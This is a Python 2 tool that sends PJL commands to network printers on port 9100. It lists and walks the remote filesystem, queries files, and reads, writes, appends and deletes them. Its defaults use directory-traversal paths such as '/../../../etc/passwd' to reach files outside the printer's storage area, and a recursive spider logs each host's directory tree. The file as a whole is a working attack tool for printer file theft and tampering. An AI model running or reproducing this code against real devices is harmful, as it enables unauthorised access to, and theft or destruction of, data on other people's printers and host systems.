import os
import sys
import socket
import select

class pjl_commands(object):
	def __init__(self):
		self.host="127.0.0.1"
		self.port=9100
		self.s = ""
		self.req = ""
		self.cnt = 0
		self.rBuf = ""
		self.sBuf = ""
		self.drive = "0:"
		self.hFile = "test.txt"
		self.dFile = "/../../../etc/passwd"
		self.lDir = "/../../../"
		self.path = "/../../../"
		self.home = "/../../../"
		self.ftype = ""
		self.size = 999999999
		self.downSize = 0
		self.upSize = 0
		self.saveData = "tmp.download.file"
		self.fileBuf = ""
		self.error=0
		self.errortype=0
	
	def printError(self):
		"""whoohooo my own error function, believe me it is AWESOME!!"""
		if self.errortype == 0:
			print "Alright!"
		elif self.errortype == 1:
			print "Uhm."
		else:
			print "Unknown Errorcode: %d" % (self.errortype)

	def createSocket(self, host, port):
		""" create the socket """
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,port))
			self.s = s
			return
		except socket.error,e:
			print "%s" % e
			return

	def sendRequest(self,command):
		""" send the request """	
		pjlS = "@PJL\r\n"
		try:
			self.s.send(pjlS)
			self.s.send(command)
		except socket.error, e:
			print "Error: %s" % e

		return

	def recvRequest(self):
		""" recv the data from the request and put it into a buffer """
		self.rBuf=self.s.recv(self.size)

	def sendRequestSelect(self):
		""" send Data """
		outputs = [self.s]
		sdata = 0
		while len(outputs)>0:
			if sdata >= self.upSize:
			#if len(self.sBuf) >= self.upSize:
				print "Finished"
				break

			print "while %d" % len(outputs)
			try:
				inputrdy,outputrdy,exceptrdy = select.select([],outputs,[])
			except select.error, e:
				break

			except socket.error, e:
				break

			for canidate in outputrdy:
				if canidate == self.s:
					print "send"
					data = self.s.send(self.fileBuf)
					#laenge wichtig hier
					#self.sBuf=self.sBuf+data
					sdata = sdata + data
					if not data:
						print "input: %d" % (len(self.sBuf))
						print "sdata: %d" % sdata
						break
						#print "data: %d" % (len(data))
		escE = "\r\n\x1b%-12345X"
		self.s.send(escE)

	def recvRequestSelectNormal(self):
		""" recv the data from the request and put it into a buffer """
		running = 1
		inputs = [self.s]
		while running:

#			print "while %d" % len(inputs)
			try:
				inputrdy,outputrdy,exceptrdy = select.select(inputs,inputs,[])
				#inputrdy,outputrdy,exceptrdy = select.select(inputs,[],[])
			except select.error, e:
				break

			except socket.error, e:
				break
			for canidate in outputrdy:
				if canidate == self.s:
					break

			for canidate in inputrdy:
				if canidate == self.s:
					print "recv"
					data = self.s.recv(1024)
					if data:
						self.rBuf=self.rBuf+data
					else:
						return
#						print "input: %d" % (len(self.rBuf))
#						print "data: %d" % (len(data))

	def recvRequestSelect(self):
		""" recv the data from the request and put it into a buffer """
		running = 1
		inputs = [self.s]
		while len(inputs)>0:
			if len(self.rBuf) >= self.downSize:
				print "Finished"
				break

#			print "while %d" % len(inputs)
			try:
				inputrdy,outputrdy,exceptrdy = select.select(inputs,[],[])
			except select.error, e:
				break

			except socket.error, e:
				break

			for canidate in inputrdy:
				if canidate == self.s:
#					print "recv"
					data = self.s.recv(1024)
					if data:
						self.rBuf=self.rBuf+data
#						print "input: %d" % (len(self.rBuf))
#						print "data: %d" % (len(data))

	def parseRequest(self):
		""" pre-parse the request and remove control-sequences """
		self.rBuf = self.rBuf.replace('\x0c','')

	def buildRequest(self, request):
		""" put together the request to send """
		#sequences
		escS = "\x1b%-12345X@PJL "
		escE = "\r\n\x1b%-12345X"

		#commands
		infoid	= "INFO ID"
		infofsys = "INFO FILESYS"
		infoconf = "INFO CONFIG"
		infomem = " INFO MEMORY"
		infopcount = "INFO PAGECOUNT"
		infostatus = "INFO STATUS"
		infovars = "INFO VARIABLES"
		infoustatus = "INFO USTATUS"
		
		fsdownload = "FSDOWNLOAD FORMAT:BINARY NAME = "	
		fsdirlist = "FSDIRLIST NAME = "
		fsupload = "FSUPLOAD NAME = "
		fsquery = "FSQUERY NAME = "
		fsmkdir = "FSMKDIR NAME = "
		fsappend = "FSAPPEND FORMAT:BINARY NAME = "
		fsdelete = "FSDELETE NAME = "
		ustatuson = "USTATUS"
		ustatusoff = "USTATUSOFF"

		rdymsg = "RDYMSG DISPLAY = "
		opmsg = "OPMSG DISPLAY = "
		stmsg = "STMSG DISPLAY = "

		if request=="infofsys":
			self.req = "%s%s%s" % (escS,infofsys,escE)

		elif request=="getDrive":
			self.req = "%s%s%s" % (escS,infofsys,escE)

		elif request=="infoconf":
			self.req = "%s%s%s" % (escS,infoconf,escE)

		elif request=="infoid":
			self.req = "%s%s%s" % (escS,infoid,escE)

		elif request=="infomem":
			self.req = "%s%s%s" % (escS,infomem,escE)

		elif request=="infostatus":
			self.req = "%s%s%s" % (escS,infostatus,escE)

		elif request=="infovars":
			self.req = "%s%s%s" % (escS,infovars,escE)

		elif request=="infoustat":
			self.req = "%s%s%s" % (escS,infoustatus,escE)

		elif request=="fsdirlist":
			self.req = "%s%s\"%s%s\" ENTRY=1 COUNT=999999999%s" % (escS,fsdirlist,self.drive,self.lDir ,escE)

		elif request=="fsquery":
			self.req = "%s%s\"%s%s\"%s" % (escS,fsquery,self.drive,self.dFile,escE)

		elif request=="fsupload":
			self.req = "%s%s\"%s%s\" OFFSET=0 SIZE=%d %s" % (escS,fsupload,self.drive,self.dFile,self.size,escE)

		elif request=="fsdownload":
			self.req = "%s%s\"%s%s\" SIZE=%d\r\n" % (escS,fsdownload,self.drive,self.dFile,self.size)

		elif request=="fsappend":
			self.req = "%s%s\"%s%s\" SIZE=%d\r\n" % (escS,fsappend,self.drive,self.dFile,self.size)

		elif request=="fsmkdir":
			self.req = "%s%s\"%s%s\"%s" % (escS,fsmkdir,self.drive,self.dFile,escE)

		elif request=="fsdelete":
			self.req = "%s%s\"%s%s\"%s" % (escS,fsdelete,self.drive,self.dFile,escE)

	def parseFSQUERY(self):			
		""" find type and size of file or dir or not exists"""
		data = self.rBuf
		print "Respone: %s" % data
		#check for error
		ferror = data.find('FILEERROR')
		if ferror>=0:
			self.error=1
			return -1
		else:
			self.error=0

		#find type
		ftype = data.find('TYPE=')
		print ftype
		ftypeE = data.find(' ',ftype)
		ftype = data[ftype+5:ftypeE]
		self.ftype = ftype
		self.ftype = self.ftype.replace('\r','')
		self.ftype = self.ftype.replace('\n','')
		#self.ftype = self.ftype.rstrip()
		print "Filetype: [%s]" % self.ftype

		if self.ftype == "FILE":
			s1 = data.find('SIZE=')
			s2 = data.find('\r\n')
			sz = data[(s1+5):s2]
			try:
				self.size = int(sz)
			except ValueError:
				print "Dang, recv buffer to small for dir, just reseting self.size"
				self.size=99999999
			print "SIZE: [%d]" % self.size
	
	def loadFile(self):
		#remove last byte
		fr = open(self.hFile,"r")
		self.fileBuf = fr.read()
		fr.close()
		print "fileBuf: %d" % (len(self.fileBuf))

	def saveFile(self):
		#remove last byte
		self.rBuf = self.rBuf[0:-1]
		fw = open(self.saveData,"w")
		fw.write(self.rBuf)
		fw.close()
	
	def parseGetDrive(self):
		""" get the current drive from the filesys info
		attention only one drive added, possible more drives not
		taken care of """
		print "implement me"
	
	def spiderSaveLog(self,lDir,rlist,logname):
		"""save spider data to logfile """
		print "lDir: %s" % lDir
		print "rlist: %s" % rlist

		fw = open(logname,'a')
		print len(rlist)
		if len(rlist) == 1:
			write="%s\n" % (lDir)
			fw.write(write)
			
		for item in rlist:
			if item != '':
				write="%s/%s\n" % (lDir, item)
				fw.write(write)

		fw.close()

	def buildListdir(self,lDir):
		"""sub-function for fslistdir"""
		dirWalk=[]
		self.lDir=lDir
		self.buildRequest("fsdirlist")
		self.sendRequest(self.req)
		self.size=9999999
		self.recvRequest()
		self.parseRequest()

		rlist = self.rBuf.split('\r\n')
		#print rlist
		rlist.pop(0)
		rlist.pop(0)
		rlist.pop(0)
#		print rlist
		print "Dirlisting:"
		self.spiderSaveLog(lDir,rlist,self.host+'.log.txt')
		for item in rlist:
			print item

		for item in rlist:
			f1 = item.find('TYPE=DIR')
			if f1 >= 0:
				i0 = item.split(' ')
				dirWalk.append(i0[0])

		print dirWalk
		return dirWalk
	
	def checkAccess(self, entry):
		self.lDir=entry
		self.buildRequest("fsdirlist")
		self.sendRequest(self.req)
		self.size=9999999
		self.recvRequest()
		self.parseRequest()

		#check for error
		ferror = self.rBuf.find('FILEERROR')
		if ferror>=0:
			self.error=1
			return -1
		else:
			self.error=0

#		print "buff: %s" % self.rBuf

	def checkFileType(self, entry):
		"""check the filetype"""
		print "checkFileType"
		self.dFile = entry
		self.buildRequest("fsquery")
		self.sendRequest(self.req)
		self.size=99999999
		self.recvRequest()
		self.parseRequest()

		self.parseFSQUERY()
		print "Type: [%s]" % (self.ftype) 

		return self.ftype


	def walkTree(self,edir):
		"""tree walk function, for walking remote directories"""

		self.cnt+=1
		self.checkAccess(edir)
		self.checkFileType(edir)

		if self.ftype != "DIR":
			print "Not directory, End"
			return
		elif self.error == 1:
			print "Fileerror"
			return
		
		print "Absolute Path: %s" % self.dFile
		#self.buildListdir(self.dFile)
		saveDir=self.dFile
		for file in [ file for file in self.buildListdir(self.dFile)]:
			self.dFile=saveDir
			print "File: %s " % file
			print "dFile: %s" % self.dFile
			print "Path: %s" % self.path
			nfile = self.dFile+'/'+file
			print "nFile: %s" % nfile
			self.checkAccess(nfile)
			if self.error!=1:
				if self.checkFileType(nfile) == "DIR":
					print "got DIR!!"
					#return
					self.walkTree(nfile)

		#print "Finished Spider"
		return 
